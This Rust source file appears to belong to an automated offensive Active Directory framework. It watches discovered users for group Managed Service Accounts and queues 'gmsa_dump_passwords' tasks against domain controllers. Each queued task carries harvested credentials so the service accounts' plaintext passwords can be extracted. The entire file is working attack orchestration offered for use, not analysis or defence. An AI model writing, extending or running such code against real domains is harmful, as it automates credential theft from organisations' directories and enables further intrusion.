//! auto_gmsa_extraction -- dump gMSA passwords when gMSA accounts are found.
//!
//! Group Managed Service Accounts (gMSA) store their passwords in Active
//! Directory in the `msDS-ManagedPassword` attribute. Any principal with read
//! access can retrieve the plaintext password. When we discover users whose
//! names end with `$` and whose descriptions mention "managed service account"
//! (or via BloodHound gMSA edges), we dispatch `gmsa_dump_passwords`.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Monitors for gMSA accounts and dispatches password extraction.
/// Interval: 30s.
pub async fn auto_gmsa_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<GmsaWork> = {
            let state = dispatcher.state.read().await;

            // Need at least one credential to query AD for gMSA passwords
            if state.credentials.is_empty() {
                continue;
            }

            // Find gMSA-like accounts from discovered users
            let gmsa_accounts: Vec<GmsaWork> = state
                .users
                .iter()
                .filter_map(|user| {
                    // gMSA accounts typically end with $ and have "managed service"
                    // in description, or their name contains "gmsa" / "msds"
                    let is_gmsa = user.username.ends_with('$')
                        && (user.description.to_lowercase().contains("managed service")
                            || user.username.to_lowercase().contains("gmsa"));

                    if !is_gmsa {
                        return None;
                    }

                    let dedup_key = format!(
                        "{}:{}",
                        user.domain.to_lowercase(),
                        user.username.to_lowercase()
                    );
                    if state.is_processed(DEDUP_GMSA_ACCOUNTS, &dedup_key) {
                        return None;
                    }

                    // Find a credential we can use to query this domain
                    let cred = state
                        .credentials
                        .iter()
                        .find(|c| c.domain.to_lowercase() == user.domain.to_lowercase())?;

                    let dc_ip = state
                        .domain_controllers
                        .get(&user.domain.to_lowercase())
                        .cloned()?;

                    Some(GmsaWork {
                        dedup_key,
                        gmsa_account: user.username.clone(),
                        domain: user.domain.clone(),
                        dc_ip,
                        credential: cred.clone(),
                    })
                })
                .collect();

            gmsa_accounts
        };

        for item in work {
            let payload = json!({
                "technique": "gmsa_dump_passwords",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "gmsa_account": item.gmsa_account,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, 3)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        gmsa_account = %item.gmsa_account,
                        domain = %item.domain,
                        "gMSA password dump dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_GMSA_ACCOUNTS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_GMSA_ACCOUNTS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(gmsa = %item.gmsa_account, "gMSA task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, gmsa = %item.gmsa_account, "Failed to dispatch gMSA dump")
                }
            }
        }
    }
}

struct GmsaWork {
    dedup_key: String,
    gmsa_account: String,
    domain: String,
    dc_ip: String,
    credential: ares_core::models::Credential,
}
